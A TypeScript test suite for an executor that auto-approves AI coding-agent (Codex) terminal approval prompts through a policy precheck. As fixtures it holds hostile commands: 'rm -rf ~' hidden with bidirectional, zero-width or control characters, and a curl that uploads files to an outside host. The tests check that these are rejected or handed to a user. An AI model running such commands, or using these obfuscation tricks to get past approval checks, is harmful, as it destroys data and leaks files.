import { afterEach, describe, expect, test } from 'bun:test'
import { mkdirSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { type Activity, fail, ok, type Result, taskContract } from '@raindown/core'
import {
  approvalForPrecheck,
  CODEX_ORCA_PRECHECK_TOOL,
  classifyCodexOrca,
} from '../src/codex-orca/classify.ts'
import { createCodexOrcaExecutor } from '../src/codex-orca/executor.ts'
import type { OrcaTerminalRead } from '../src/codex-orca/orca.ts'
import {
  createNodeHubClient,
  createPolicyPrecheck,
  type ExecutorContext,
  type ExecutorOutcome,
  type Precheck,
  type PrecheckRequest,
  type PrecheckVerdict,
} from '../src/index.ts'
import { needsUserText } from '../src/precheck.ts'
import { FakeGh, FakeOrca, type OrcaHome, orcaHome, tuiFixture } from './codex-orca-helpers.ts'
import { type Bench, bench, ManualClock } from './harness.ts'
import { waitFor as until } from './wait.ts'

/**
 * codex-orca 的策略预检（add-m1-inbox 2.3）：识别到授权弹窗时先预检，放行则发回车；
 * 发回车前重读实时终端确认弹窗与命令未变。Orca 与 gh 都是假实现，终端内容来自真实 fixture 改写。
 */

const POLL = 30_000
let h: OrcaHome | undefined
let b: Bench | undefined
afterEach(async () => {
  if (h) rmSync(h.root, { recursive: true, force: true })
  h = undefined
  await b?.close()
  b = undefined
})

const APPROVAL = tuiFixture('approval')
const COMMAND = 'mkdir -p /tmp/raindown-tui-probe-dir2'
/** 改写 approval fixture 的末尾行。 */
const approvalWith = (edit: (tail: string[]) => string[]): OrcaTerminalRead => ({
  ...APPROVAL,
  tail: edit([...APPROVAL.tail]),
})
const replaceLine = (from: string, to: string) => (tail: string[]) =>
  tail.map((l) => (l.includes(from) ? l.replace(from, to) : l))

async function start(
  reads: OrcaTerminalRead[],
  precheck?: Precheck,
  extra: Partial<
    Pick<ExecutorContext, 'reportBranch' | 'confirmApproval' | 'hubUrl' | 'leaseTokenFile'>
  > = {},
  onOrca?: (orca: FakeOrca) => void,
  native?: boolean,
) {
  h = orcaHome()
  if (native)
    // native（tasks 5.1）：workspace-write + on-request 的角色，开关打开（只在临时目录中计算 profile，不运行 codex）。
    writeFileSync(
      join(h.home, 'config/roles/dev.yaml'),
      'name: dev\nexecutor: codex-orca\nprompt: dev.md\npermissions:\n  approval: on-request\n  sandbox: workspace-write\n',
    )
  const clock = new ManualClock()
  const orca = new FakeOrca(h.worktree)
  onOrca?.(orca)
  orca.reads.push(...reads.map((r) => ok(r)))
  const plugin = createCodexOrcaExecutor({
    home: h.home,
    codexAuthSource: join(h.root, 'user-codex'),
    clock,
    orca,
    gh: new FakeGh(),
    baseBranch: async () => 'origin/main',
    waitForSetup: async () => ok(undefined),
    ...(native
      ? {
          isolation: {
            enforce: true,
            platform: 'darwin' as const,
            userHome: join(h.root, 'user'),
            env: {},
          },
        }
      : {}),
  })
  const contract = taskContract.parse({
    goal: '修正 README',
    workspace: 'ws/product-res',
    role: 'dev',
    executor: 'codex-orca',
    context: ['projects/product-res'],
    inputs: { repo: h.repo },
  })
  const abort = new AbortController()
  const run = plugin.run(contract, {
    taskId: 't-orca-1',
    attempt: 1,
    cwd: h.home,
    nodeId: 'n-test',
    signal: abort.signal,
    ...(precheck ? { precheck } : {}),
    ...extra,
  })
  const activity: Activity[] = []
  let blockSeq = 0
  const replySequences = new Map<string, number>()
  const fingerprints = new Map<number, string>()
  const originalDeliver = run.deliver?.bind(run)
  run.deliver = (reply) => {
    const seq = reply.block_seq ?? replySequences.get(reply.reply_id) ?? blockSeq
    replySequences.set(reply.reply_id, seq)
    return (
      originalDeliver?.({
        ...reply,
        block_seq: seq,
        approval_fingerprint: reply.approval_fingerprint ?? fingerprints.get(seq),
      }) ?? Promise.resolve('not_running')
    )
  }
  void (async () => {
    for await (const a of run.activity) {
      activity.push(a)
      if (a.data?.idle) {
        blockSeq++
        const hint = a.data.hint as
          | { request_id?: string; approval_fingerprint?: string }
          | undefined
        if (hint?.approval_fingerprint) fingerprints.set(blockSeq, hint.approval_fingerprint)
        if (hint?.request_id) run.bindBlocked?.({ seq: blockSeq, request_id: hint.request_id })
      }
    }
  })()
  let outcome: Result<ExecutorOutcome> | undefined
  void run.done.then((o) => {
    outcome = o
  })
  await until(() => clock.pendingTimers() > 0 || outcome !== undefined, '启动 Codex 并落盘')
  const poll = async (n = 1) => {
    for (let i = 0; i < n; i++) {
      const before = orca.ops('terminalRead').length
      // 等监控循环挂上下一次轮询的定时器（上一轮的预检、重读与发送都是异步的）再拨动时钟。
      await until(() => clock.pendingTimers() > 0 || outcome !== undefined, '轮询定时器')
      await clock.advance(POLL)
      await until(() => orca.ops('terminalRead').length > before || outcome !== undefined, '读取')
      await until(() => clock.pendingTimers() > 0 || outcome !== undefined, '本轮预检结束')
    }
  }
  return {
    run,
    orca,
    activity,
    poll,
    idles: () => activity.filter((a) => a.data?.idle === true),
    enters: () =>
      orca
        .ops('terminalSend')
        .map((c) => c.input as { text?: string; enter?: boolean })
        .filter((i) => i.enter && i.text === undefined),
    texts: () => activity.map((a) => a.text ?? ''),
  }
}

/** 记录请求并返回给定结论的预检桩。 */
function stub(verdict: PrecheckVerdict, onCall?: () => void) {
  const calls: PrecheckRequest[] = []
  const precheck: Precheck = async (req) => {
    calls.push(req)
    onCall?.()
    return verdict
  }
  return { precheck, calls }
}

const ALLOW: PrecheckVerdict = { allow: true, level: 'auto', actions: ['tool:CodexCommand'] }

describe('严格解析授权弹窗', () => {
  test('真实 fixture：取出原始命令与弹窗全文', () => {
    const p = approvalForPrecheck(APPROVAL.tail)
    expect(p?.command).toBe(COMMAND)
    expect(p?.prompt[0]).toContain('Would you like to run the following command?')
    expect(p?.prompt.at(-1)).toContain('Press enter to confirm or esc to cancel')
  })

  const rejects: Array<[string, OrcaTerminalRead]> = [
    ['没有 $ 命令行', approvalWith((t) => t.filter((l) => !l.includes('$ mkdir')))],
    [
      '光标在"不再询问"上',
      approvalWith((t) =>
        t.map((l) =>
          l.startsWith('› 1. Yes')
            ? l.replace('› 1.', '  1.')
            : l.startsWith('  2. Yes')
              ? l.replace('  2.', '› 2.')
              : l,
        ),
      ),
    ],
    [
      '命令折行（$ 行与选项之间还有内容）',
      approvalWith((t) => {
        const i = t.findIndex((l) => l.includes('$ mkdir'))
        return [...t.slice(0, i + 1), '    && gh pr merge 42', ...t.slice(i + 1)]
      }),
    ],
    [
      '命令被截断',
      approvalWith(
        replaceLine('$ mkdir -p /tmp/raindown-tui-probe-dir2', '$ mkdir -p /tmp/raindown…'),
      ),
    ],
    [
      '两行 $ 命令',
      approvalWith((t) => {
        const i = t.findIndex((l) => l.includes('Reason:'))
        return [...t.slice(0, i + 1), '  $ ls', ...t.slice(i + 1)]
      }),
    ],
    ['页脚不在最底部', approvalWith((t) => [...t, '› Ask Codex to do anything'])],
    ['命令含双向覆盖字符', approvalWith(replaceLine(COMMAND, 'ls ‮; rm -rf ~'))],
    ['命令含零宽字符', approvalWith(replaceLine(COMMAND, 'gi​t push'))],
    ['命令含控制字符', approvalWith(replaceLine(COMMAND, 'ls\u001b[2K; rm -rf ~'))],
    ['命令含制表符', approvalWith(replaceLine(COMMAND, 'ls\trm'))],
    [
      '编辑请求（没有命令）',
      approvalWith(
        replaceLine(
          'Would you like to run the following command?',
          'Would you like to make the following edits?',
        ),
      ),
    ],
  ]
  for (const [name, read] of rejects) {
    test(`${name}：不可预检`, () => {
      expect(approvalForPrecheck(read.tail)).toBeUndefined()
    })
  }
})

describe('codex-orca 监控循环中的预检', () => {
  test('运行中已有 .codex：不进入预检、不发按键，关闭终端并 blocked', async () => {
    const { precheck, calls } = stub(ALLOW)
    const s = await start([APPROVAL], precheck)
    mkdirSync(join(h?.worktree ?? '', '.codex'))
    await s.poll()
    expect(await s.run.done).toMatchObject({
      ok: true,
      data: {
        outcome: 'blocked',
        reason: 'other',
        message: expect.stringContaining('project_codex_config'),
      },
    })
    expect(calls).toEqual([])
    expect(s.orca.ops('terminalSend')).toEqual([])
    expect(s.orca.ops('terminalClose')).toHaveLength(1)
  })

  test('等待预检结果时出现 .codex：即使策略放行也不发 Enter', async () => {
    const { precheck, calls } = stub(ALLOW, () => {
      mkdirSync(join(h?.worktree ?? '', '.codex'))
    })
    const s = await start([APPROVAL], precheck)
    await s.poll()
    expect(await s.run.done).toMatchObject({
      ok: true,
      data: {
        outcome: 'blocked',
        reason: 'other',
        message: expect.stringContaining('project_codex_config'),
      },
    })
    expect(calls).toHaveLength(1)
    expect(s.orca.ops('terminalSend')).toEqual([])
    expect(s.orca.ops('terminalClose')).toHaveLength(1)
  })

  test('auto：发回车放行、记活动，不上报停下；同一弹窗只预检一次', async () => {
    const { precheck, calls } = stub(ALLOW)
    const s = await start([APPROVAL, APPROVAL, tuiFixture('working')], precheck)
    await s.poll(1)
    // 命令在 Orca worktree 中执行（D15 command_cwd），弹窗的 Reason 一并带上（只用于请求文本）。
    expect(calls).toEqual([
      {
        tool: CODEX_ORCA_PRECHECK_TOOL,
        command: COMMAND,
        cwd: h?.worktree as string,
        reason: '当前沙箱为只读，是否授权执行 mkdir -p /tmp/raindown-tui-probe-dir2 创建目录？',
      },
    ])
    expect(s.enters()).toHaveLength(1)
    expect(s.texts().some((t) => t.startsWith('策略自动放行：执行命令 mkdir'))).toBe(true)
    s.orca.reads = [
      ok({
        ...tuiFixture('working'),
        tail: [`• Ran ${COMMAND}`, '• Working (1s • esc to interrupt)'],
      }),
    ]
    await s.poll(3)
    expect(s.idles()).toHaveLength(0)
    expect(calls).toHaveLength(1)
    expect(s.activity.filter((a) => a.data?.out_of_band)).toHaveLength(0)
    await s.run.cancel()
  })

  test('auto-report：同样放行', async () => {
    const { precheck } = stub({ allow: true, level: 'auto-report', actions: ['pr.create'] })
    const s = await start([APPROVAL, APPROVAL, tuiFixture('working')], precheck)
    await s.poll(2)
    expect(s.enters()).toHaveLength(1)
    expect(s.idles()).toHaveLength(0)
    await s.run.cancel()
  })

  for (const [name, verdict] of [
    ['draft-approve', { allow: false, level: 'draft-approve' }],
    ['预检失败', { allow: false, error: 'hub_unavailable：无法连接中枢' }],
  ] as Array<[string, PrecheckVerdict]>) {
    test(`${name}：不发任何按键，照常上报 awaiting_approval；不重复预检`, async () => {
      const { precheck, calls } = stub(verdict)
      const s = await start([APPROVAL], precheck)
      await s.poll(3)
      expect(s.enters()).toHaveLength(0)
      expect(s.orca.ops('terminalSend')).toHaveLength(0)
      const [idle] = s.idles()
      expect((idle?.data?.hint as { kind: string } | undefined)?.kind).toBe('awaiting_approval')
      expect(calls).toHaveLength(1)
      await s.run.cancel()
    })
  }

  test('提取不到命令：不预检，交给用户', async () => {
    const { precheck, calls } = stub(ALLOW)
    const s = await start([approvalWith((t) => t.filter((l) => !l.includes('$ mkdir')))], precheck)
    await s.poll(2)
    expect(calls).toHaveLength(0)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    expect(s.idles()).toHaveLength(1)
    expect(s.texts()).toContain('授权请求中提取不到可核对的命令，交给用户审批')
    await s.run.cancel()
  })

  test('预检期间命令变了：不发回车，下一轮按新弹窗重新判定', async () => {
    const changed = approvalWith(replaceLine(COMMAND, 'gh pr merge 42'))
    let orca: FakeOrca | undefined
    const { precheck, calls } = stub(ALLOW, () => {
      // 预检进行中：终端换成了另一条命令的弹窗。
      if (calls.length === 1 && orca) orca.reads.splice(0, orca.reads.length, ok(changed))
    })
    const s = await start([APPROVAL], async (req) => precheck(req))
    orca = s.orca
    await s.poll(1)
    expect(s.enters()).toHaveLength(0)
    expect(s.texts()).toContain('策略预检期间终端界面已变化，没有发送回车，下一轮重新判定')
    await s.poll(1)
    // 新弹窗重新预检，带的是新命令；此桩仍放行，于是发出了一次回车（核对一致）。
    expect(calls.map((c) => c.command)).toEqual([COMMAND, 'gh pr merge 42'])
    expect(s.enters()).toHaveLength(1)
    await s.run.cancel()
  })

  test('界面每次预检期间都在变：重试有上限，最终照常上报停下，从不发回车', async () => {
    let orca: FakeOrca | undefined
    let n = 0
    const { precheck, calls } = stub(ALLOW, () => {
      n++
      orca?.reads.splice(0, orca.reads.length, ok(approvalWith(replaceLine(COMMAND, `ls /d${n}`))))
    })
    const s = await start([APPROVAL], precheck)
    orca = s.orca
    await s.poll(6)
    expect(s.enters()).toHaveLength(0)
    expect(s.idles()).toHaveLength(1)
    const before = calls.length
    await s.poll(2)
    // 上报停下之后不再预检。
    expect(calls.length).toBe(before)
    await s.run.cancel()
  })

  test('预检期间弹窗消失（Codex 改问问题）：不发回车', async () => {
    let orca: FakeOrca | undefined
    const { precheck } = stub(ALLOW, () => {
      orca?.reads.splice(0, orca.reads.length, ok(tuiFixture('question')))
    })
    const s = await start([APPROVAL], precheck)
    orca = s.orca
    await s.poll(3)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    expect(s.idles()).toHaveLength(1)
    await s.run.cancel()
  })

  test('预检期间光标移到"不再询问"：不发回车', async () => {
    const moved = approvalWith((t) =>
      t.map((l) =>
        l.startsWith('› 1. Yes')
          ? l.replace('› 1.', '  1.')
          : l.startsWith('  2. Yes')
            ? l.replace('  2.', '› 2.')
            : l,
      ),
    )
    let orca: FakeOrca | undefined
    const { precheck } = stub(ALLOW, () => {
      orca?.reads.splice(0, orca.reads.length, ok(moved))
    })
    const s = await start([APPROVAL], precheck)
    orca = s.orca
    await s.poll(3)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    await s.run.cancel()
  })

  test('没有预检（ctx.precheck 缺省）：行为不变，照常上报', async () => {
    const s = await start([APPROVAL])
    await s.poll(2)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    expect(s.idles()).toHaveLength(1)
    await s.run.cancel()
  })
})

describe('codex-orca 的代回复支撑（D15，tasks 5.6）', () => {
  const SUPERVISOR: PrecheckVerdict = { allow: false, level: 'supervisor', decision_id: 77 }

  test('开始时上报任务分支与 worktree', async () => {
    const reports: Array<{ branch: string; worktree: string }> = []
    const s = await start([APPROVAL], undefined, { reportBranch: (r) => void reports.push(r) })
    expect(reports).toHaveLength(1)
    expect(reports[0]?.worktree).toBe(h?.worktree as string)
    expect(reports[0]?.branch).toBeTruthy()
    await s.run.cancel()
  })

  test('等 reportBranch 的快照采集完成后才启动 Codex 终端', async () => {
    let orca: FakeOrca | undefined
    let createdAtDone: number | undefined
    const s = await start(
      [APPROVAL],
      undefined,
      {
        reportBranch: () =>
          new Promise<void>((resolve) =>
            setTimeout(() => {
              // 快照完成的这一刻还没有建终端。
              createdAtDone = orca?.ops('terminalCreate').length
              resolve()
            }, 30),
          ),
      },
      (o) => {
        orca = o
      },
    )
    await until(() => s.orca.ops('terminalCreate').length === 1, '启动终端')
    expect(createdAtDone).toBe(0)
    await s.run.cancel()
  })

  test('supervisor 档位：不发回车；停下时 hint 带 decision_id', async () => {
    const { precheck } = stub(SUPERVISOR)
    const s = await start([APPROVAL], precheck)
    await s.poll(3)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    const [idle] = s.idles()
    expect((idle?.data?.hint as { decision_id?: number } | undefined)?.decision_id).toBe(77)
    await s.run.cancel()
  })

  test('弹窗换了：新的停下不带旧的 decision_id', async () => {
    const other = approvalWith(replaceLine(COMMAND, 'ls /other'))
    let orca: FakeOrca | undefined
    const calls: string[] = []
    const s = await start([APPROVAL], async (req) => {
      calls.push(req.command ?? '')
      if (calls.length === 1) {
        // 第一个弹窗判为 supervisor；随后界面换成另一条命令（交给用户）。
        orca?.reads.splice(0, orca.reads.length, ok(other))
        return SUPERVISOR
      }
      return { allow: false, level: 'user' }
    })
    orca = s.orca
    await s.poll(4)
    expect(calls).toEqual([COMMAND, 'ls /other'])
    expect(s.idles().length).toBeGreaterThan(0)
    for (const idle of s.idles()) {
      expect(idle.data?.hint as Record<string, unknown>).not.toHaveProperty('decision_id')
    }
    await s.run.cancel()
  })

  test('批准已尝试但回执失败，再因环境变化拒收时保留送达结果的不确定性', async () => {
    let confirmed = 0
    const s = await start([APPROVAL], undefined, {
      confirmApproval: async () => ++confirmed === 1,
    })
    await s.poll(2)
    s.orca.sends = [fail('retryable', 'orca_unavailable', '回执暂时不可用')]
    const reply = { reply_id: 'uncertain-supervisor', kind: 'approve' as const, by: 'supervisor' }
    await expect(s.run.deliver?.(reply)).rejects.toThrow('回执暂时不可用')
    expect(await s.run.deliver?.(reply)).toEqual({
      outcome: 'dropped',
      reason: 'request_changed',
      attempted: true,
    })
    expect(await s.run.deliver?.(reply)).toEqual({
      outcome: 'dropped',
      reason: 'request_changed',
      attempted: true,
    })
    expect(s.enters()).toHaveLength(1)
    expect(s.texts().some((text) => text.includes('可能没有送达'))).toBe(true)
    await s.run.cancel()
  })

  test('批准送达：重读弹窗交给 confirmApproval；拒收时不发任何按键并返回 dropped，幂等', async () => {
    const lives: unknown[] = []
    let answer = false
    const { precheck } = stub(SUPERVISOR)
    const s = await start([APPROVAL], precheck, {
      confirmApproval: async (_reply, live) => {
        lives.push(live)
        return answer
      },
    })
    await s.poll(3)
    const reply = { reply_id: 'r-1', kind: 'approve' as const, by: 'supervisor' }
    expect(await s.run.deliver?.(reply)).toBe('dropped')
    expect(lives).toEqual([
      { tool: CODEX_ORCA_PRECHECK_TOOL, command: COMMAND, cwd: h?.worktree as string },
    ])
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    // 同一条回复再次送达：仍是 dropped，不再复核。
    expect(await s.run.deliver?.(reply)).toBe('dropped')
    expect(lives).toHaveLength(1)
    // 拒收后：同一弹窗不再预检，监控循环随后重新上报停下（交给用户）。
    const before = s.idles().length
    await s.poll(3)
    expect(s.idles().length).toBeGreaterThan(before)
    answer = true
    expect(await s.run.deliver?.({ ...reply, reply_id: 'r-2' })).toBe('delivered')
    expect(s.enters()).toHaveLength(1)
    await s.run.cancel()
  })

  test('复核通过后界面变了：拒收旧批准，用户也必须等待新的阻塞回合', async () => {
    let orca: FakeOrca | undefined
    const other = approvalWith(replaceLine(COMMAND, 'ls /other'))
    const { precheck } = stub(SUPERVISOR)
    const s = await start([APPROVAL], precheck, {
      confirmApproval: async () => {
        // 复核期间终端换成了另一条命令的弹窗。
        orca?.reads.splice(0, orca.reads.length, ok(other))
        return true
      },
    })
    orca = s.orca
    await s.poll(3)
    expect(await s.run.deliver?.({ reply_id: 'r-1', kind: 'approve', by: 'supervisor' })).toBe(
      'dropped',
    )
    expect(s.enters()).toHaveLength(0)
    // 新的弹窗尚未上报，旧回合的用户批准也不能按键。
    await expect(
      s.run.deliver?.({ reply_id: 'r-2', kind: 'approve', by: 'user' }),
    ).resolves.toMatchObject({ outcome: 'dropped', reason: 'round_closed' })
    expect(s.enters()).toHaveLength(0)
    await s.poll(2)
    expect(await s.run.deliver?.({ reply_id: 'r-3', kind: 'approve', by: 'user' })).toBe(
      'delivered',
    )
    expect(s.enters()).toHaveLength(1)
    await s.run.cancel()
  })

  test('没有授权回合时的批准：不进入复核，不发送任何按键', async () => {
    const lives: unknown[] = []
    const s = await start([tuiFixture('question')], undefined, {
      confirmApproval: async (_reply, live) => {
        lives.push(live)
        return false
      },
    })
    await s.poll(2)
    await expect(
      s.run.deliver?.({ reply_id: 'r-1', kind: 'approve', by: 'supervisor' }),
    ).resolves.toMatchObject({ outcome: 'dropped', reason: 'round_closed' })
    expect(lives).toEqual([])
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    await s.run.cancel()
  })

  test('用户批准复核期间命令变化：不允许按键落到新弹窗', async () => {
    let orca: FakeOrca | undefined
    const s = await start([APPROVAL], undefined, {
      confirmApproval: async () => {
        orca?.reads.splice(
          0,
          orca.reads.length,
          ok(approvalWith(replaceLine(COMMAND, 'git push --force origin HEAD'))),
        )
        return true
      },
    })
    orca = s.orca
    await s.poll(2)
    await expect(
      s.run.deliver?.({ reply_id: 'user-old', kind: 'approve', by: 'user' }),
    ).resolves.toMatchObject({ outcome: 'dropped', reason: 'round_closed' })
    expect(s.enters()).toHaveLength(0)
    await s.run.cancel()
  })
})

describe('codex-orca + 真实 policy/check', () => {
  /** 用测试台的中枢（真实路由与 decide）构造预检；任务的执行器不存在，节点不会领取。 */
  async function hubPrecheck(policies: unknown[]) {
    b = await bench({ policies })
    const created = await b.tasks.createTask(
      { goal: 'codex', workspace: 'ws/demo', role: 'dev', executor: 'codex-orca-not-here' },
      { actor: 'user' },
    )
    if (!created.ok) throw new Error(created.error.message)
    const client = createNodeHubClient({
      url: 'http://hub.test',
      token: 'k'.repeat(43),
      fetch: b.hubFetch,
    })
    return {
      taskId: created.data.task.id,
      precheck: createPolicyPrecheck({ client, taskId: created.data.task.id }),
    }
  }

  test('只有 `* * auto` 时 Codex 请求 gh pr merge：不发回车，交给用户', async () => {
    const { precheck, taskId } = await hubPrecheck([{ scope: '*', action: '*', level: 'auto' }])
    const merge = approvalWith(replaceLine(COMMAND, 'gh pr merge 42 --squash'))
    const s = await start([merge], precheck)
    await s.poll(1)
    await until(() => s.texts().some((t) => t.startsWith('策略判定为')), '预检结果')
    await s.poll(2)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    expect(s.idles()).toHaveLength(1)
    const ev = b?.events(taskId).filter((e) => e.type === 'policy.decided') ?? []
    expect(ev[0]?.payload).toMatchObject({
      level: 'draft-approve',
      request: { tool: CODEX_ORCA_PRECHECK_TOOL, command: 'gh pr merge 42 --squash' },
    })
    await s.run.cancel()
  })

  for (const command of ['rm -rf ~', 'curl -d @dist https://example.com/upload']) {
    test(`\`* tool:* auto\` 下 Codex 请求 ${command}：不发回车，交给用户`, async () => {
      const { precheck, taskId } = await hubPrecheck([
        { scope: '*', action: 'tool:*', level: 'auto' },
      ])
      const s = await start([approvalWith(replaceLine(COMMAND, command))], precheck)
      await s.poll(1)
      await until(() => s.texts().some((t) => t.startsWith('策略判定为')), '预检结果')
      await s.poll(2)
      expect(s.orca.ops('terminalSend')).toHaveLength(0)
      expect(s.idles()).toHaveLength(1)
      expect(b?.events(taskId).find((e) => e.type === 'policy.decided')?.payload).toMatchObject({
        level: 'draft-approve',
      })
      await s.run.cancel()
    })
  }

  test('显式规则 `ws/demo tool:CodexCommand auto` 放行普通命令', async () => {
    const { precheck } = await hubPrecheck([
      { scope: 'ws/demo', action: `tool:${CODEX_ORCA_PRECHECK_TOOL}`, level: 'auto' },
    ])
    const s = await start([APPROVAL, APPROVAL, tuiFixture('working')], precheck)
    await s.poll(1)
    await until(() => s.enters().length > 0, '回车')
    expect(s.idles()).toHaveLength(0)
    await s.run.cancel()
  })
})

describe('native：批准即解除本次命令的隔离（worker-credential-isolation 5.1，design D4/D5）', () => {
  test('授权弹窗不预检、不自动放行（策略判定为 auto 也不行）；停下时 hint 带 isolation_escape，classify 标注', async () => {
    const { precheck, calls } = stub(ALLOW)
    const s = await start(
      [APPROVAL],
      precheck,
      { hubUrl: 'http://127.0.0.1:7477' },
      undefined,
      true,
    )
    await s.poll(3)
    expect(calls).toEqual([])
    expect(s.enters()).toHaveLength(0)
    expect(s.texts().some((t) => t.includes('批准即解除本次命令的隔离'))).toBe(true)
    const [idle] = s.idles()
    const hint = idle?.data?.hint as Record<string, unknown>
    expect(hint.isolation_escape).toBe(true)
    expect(hint).not.toHaveProperty('decision_id')
    const verdict = classifyCodexOrca({
      trigger: 'idle',
      tail: [],
      idle_ms: 0,
      hint,
      contract: taskContract.parse({
        goal: 'x',
        workspace: 'ws/product-res',
        role: 'dev',
        executor: 'codex-orca',
      }),
    })
    expect(verdict).toMatchObject({ reason: 'awaiting_approval' })
    expect(verdict?.message).toStartWith('【批准即解除本次命令的隔离】')
    await s.run.cancel()
  })

  test('对照：未施加 native 时同一弹窗照常预检并放行', async () => {
    const { precheck, calls } = stub(ALLOW)
    const s = await start([APPROVAL, APPROVAL, tuiFixture('working')], precheck)
    await s.poll(1)
    expect(calls).toHaveLength(1)
    expect(s.enters()).toHaveLength(1)
    await s.run.cancel()
  })

  test('策略层：带 escapesIsolation 的请求不送中枢判定，直接交给用户（supervisor 档位也不委托）', async () => {
    let called = 0
    const precheck = createPolicyPrecheck({
      client: {
        policyCheck: async () => {
          called++
          return ok({
            level: 'auto',
            actions: [{ action: 'tool:CodexCommand', level: 'auto' }],
            matched_rules: [],
          } as never)
        },
      },
      taskId: 't-1',
    })
    const v = await precheck({
      tool: CODEX_ORCA_PRECHECK_TOOL,
      command: 'ls',
      escapesIsolation: true,
    })
    expect(called).toBe(0)
    expect(v).toEqual({ allow: false, level: 'user', escapes_isolation: true })
    expect(needsUserText(v as never)).toContain('批准即解除本次命令的隔离')
  })
})
